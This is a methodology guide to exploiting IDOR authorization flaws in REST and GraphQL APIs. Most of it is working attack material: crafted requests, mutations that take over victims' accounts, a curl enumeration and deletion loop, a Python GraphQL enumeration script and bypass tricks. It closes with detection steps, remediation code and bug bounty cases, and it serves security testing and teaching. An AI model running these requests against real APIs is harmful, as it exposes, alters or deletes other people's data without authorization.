# GraphQL and REST API IDOR Exploitation

## Attack Description
Modern applications heavily rely on APIs (REST and GraphQL), making them prime IDOR targets. API-first development often prioritizes functionality over authorization, leaving object-level access controls as an afterthought. This methodology covers API-specific IDOR patterns.

## REST API IDOR Patterns

### 1. Direct Object Access
```http
# Standard IDOR in REST endpoints
GET /api/v1/users/123/profile
GET /api/v1/orders/456/details
GET /api/v1/documents/789/download
```

### 2. Nested Resource Access
```http
# Parent resource belongs to attacker, child to victim
GET /api/v1/users/attacker_id/orders/victim_order_id

# Or vice versa
GET /api/v1/users/victim_id/orders/attacker_order_id
```

### 3. Query Parameter IDOR
```http
GET /api/v1/search?user_id=victim_id&type=private_messages
POST /api/v1/export?account_id=victim_id&format=csv
```

### 4. Body Parameter IDOR
```http
POST /api/v1/transfer HTTP/1.1
Content-Type: application/json

{
  "from_account": "victim_id",  # IDOR here
  "to_account": "attacker_id",
  "amount": 1000
}
```

### 5. Mass Assignment IDOR
```http
# Original request
PUT /api/v1/profile HTTP/1.1
{"name": "Attacker", "bio": "Hello"}

# Inject unauthorized parameter
PUT /api/v1/profile HTTP/1.1
{"name": "Attacker", "bio": "Hello", "user_id": "victim_id", "role": "admin"}
```

## GraphQL IDOR Patterns

### 1. Direct Query IDOR
```graphql
query {
  user(id: "victim_uuid") {
    email
    phone
    privateData
    creditCards {
      last4digits
      expiryDate
    }
  }
}
```

### 2. Mutation IDOR
```graphql
mutation {
  updateUserProfile(userId: "victim_id", input: {
    email: "attacker@evil.com"
  }) {
    success
  }
}

mutation {
  deleteComment(commentId: "victim_comment_id") {
    deleted
  }
}
```

### 3. Nested Query IDOR
```graphql
query {
  organization(id: "any_org") {
    members {
      id
      email  # Leaks all members' PII
      role
    }
    privateDocuments {
      id
      content
    }
  }
}
```

### 4. Subscription IDOR
```graphql
subscription {
  userNotifications(userId: "victim_id") {
    message
    timestamp
    privateContent
  }
}
```

### 5. Batch Query Enumeration
```graphql
query {
  user1: user(id: "1") { email }
  user2: user(id: "2") { email }
  user3: user(id: "3") { email }
  # ... up to query limit
}
```

## Exploitation Steps

### REST API Testing
```bash
# Step 1: Capture legitimate API request
GET /api/v1/users/100/data

# Step 2: Enumerate other user IDs
for id in {1..200}; do
  curl -s "https://api.target.com/v1/users/$id/data" \
    -H "Authorization: Bearer $ATTACKER_TOKEN" \
    | jq '.email' 2>/dev/null && echo "ID: $id"
done

# Step 3: Test write operations
curl -X DELETE "https://api.target.com/v1/users/victim_id/resources/123" \
  -H "Authorization: Bearer $ATTACKER_TOKEN"
```

### GraphQL Introspection
```graphql
# Step 1: Discover schema
{
  __schema {
    types {
      name
      fields {
        name
        args {
          name
          type { name }
        }
      }
    }
  }
}

# Step 2: Find queries accepting IDs
{
  __type(name: "Query") {
    fields {
      name
      args {
        name
        type { name kind }
      }
    }
  }
}

# Step 3: Test each query with victim IDs
```

### GraphQL Enumeration Script
```python
import requests

GRAPHQL_URL = "https://target.com/graphql"
HEADERS = {"Authorization": "Bearer attacker_token"}

# Batch enumerate users
for i in range(1, 100):
    query = f'''
    query {{
      user(id: "{i}") {{
        id
        email
        privateField
      }}
    }}
    '''
    response = requests.post(GRAPHQL_URL, 
                            json={"query": query},
                            headers=HEADERS)
    data = response.json()
    if "errors" not in data and data.get("data", {}).get("user"):
        print(f"[IDOR] User {i}: {data['data']['user']}")
```

## Advanced API IDOR Techniques

### 1. API Version Bypass
```http
# v2 has authorization, v1 doesn't
GET /api/v2/users/victim_id  → 403 Forbidden
GET /api/v1/users/victim_id  → 200 OK (IDOR!)

# Or mobile API vs web API
GET /api/web/users/victim_id  → 403 Forbidden
GET /api/mobile/users/victim_id  → 200 OK (IDOR!)
```

### 2. HTTP Method Tampering
```http
# GET is protected, POST isn't
GET /api/users/victim_id → 403 Forbidden
POST /api/users/victim_id → 200 OK (with data)

# Or vice versa with state changes
PUT /api/users/victim_id/email → 403 Forbidden
PATCH /api/users/victim_id/email → 200 OK (IDOR!)
```

### 3. Content-Type Switching
```http
# JSON protected, form-data isn't
POST /api/update
Content-Type: application/json
{"user_id": "victim"} → 403 Forbidden

POST /api/update
Content-Type: application/x-www-form-urlencoded
user_id=victim → 200 OK (IDOR!)
```

### 4. GraphQL Alias Bypass
```graphql
# If there's rate limiting per field name
{
  secret1: user(id: "1") { email }
  secret2: user(id: "2") { email }
  secret3: user(id: "3") { email }
  # Aliases may bypass field-level rate limits
}
```

### 5. Relay/Pagination IDOR
```graphql
# Global ID exploitation in Relay
{
  node(id: "VXNlcjoxMjM0NQ==") {  # Base64 encoded "User:12345"
    ... on User {
      email
      privateData
    }
  }
}

# Decode, change ID, re-encode
# "User:12345" → "User:99999"
```

## Detection Method (For Auditors)

1. **API Discovery**
   - Proxy all traffic, extract API endpoints
   - Check OpenAPI/Swagger docs if exposed
   - GraphQL: run introspection query
   - Check mobile app traffic for hidden APIs

2. **Parameter Analysis**
   ```
   For each endpoint, identify:
   - Path parameters: /users/{id}
   - Query parameters: ?user_id=
   - Body parameters: {"user_id": ""}
   - Header parameters: X-User-ID
   ```

3. **Cross-Account Testing**
   - Use Burp's Autorize extension
   - Test every ID parameter with other users' values
   - Check both read AND write operations

4. **GraphQL-Specific Checks**
   - Test every query/mutation accepting ID arguments
   - Check nested resolvers for authorization gaps
   - Test node(id:) for global ID IDOR

## Remediation

### REST API
```python
@app.route('/api/users/<user_id>/data', methods=['GET'])
def get_user_data(user_id):
    # SECURE: Verify requesting user owns the resource
    if user_id != current_user.id:
        # Or check if current_user has admin role
        return {"error": "Forbidden"}, 403
    
    return get_data_for_user(user_id)
```

### GraphQL
```javascript
// SECURE: Authorization in resolver
const resolvers = {
  Query: {
    user: async (parent, { id }, context) => {
      const user = await User.findById(id);
      
      // Check authorization
      if (user.id !== context.currentUser.id && 
          !context.currentUser.isAdmin) {
        throw new ForbiddenError('Not authorized');
      }
      
      return user;
    }
  }
};
```

## Real Examples

### Shopify - GraphQL IDOR ($5,000)
BillingDocumentDownload and BillDetails queries exposed any merchant's invoices.
- https://hackerone.com/reports/2207248

### HackerOne - GraphQL Mutation ($12,500)
DeleteProfileImages mutation allowed deleting any user's certifications.
- https://hackerone.com/reports/2122671

### TikTok - Cross-Tenant GraphQL
AddRulesToPixelEvents allowed modifying any advertiser's pixel rules.
- https://hackerone.com/reports/984965

### GitLab - ML Model IDOR ($1,160)
IDOR exposed all machine learning models via API enumeration.
- https://hackerone.com/reports/2528293

## Key Insight
**APIs are the #1 IDOR hunting ground in 2025.**
Modern applications expose far more functionality via APIs than web UI.
Always test the API layer independently — frontend restrictions don't apply.
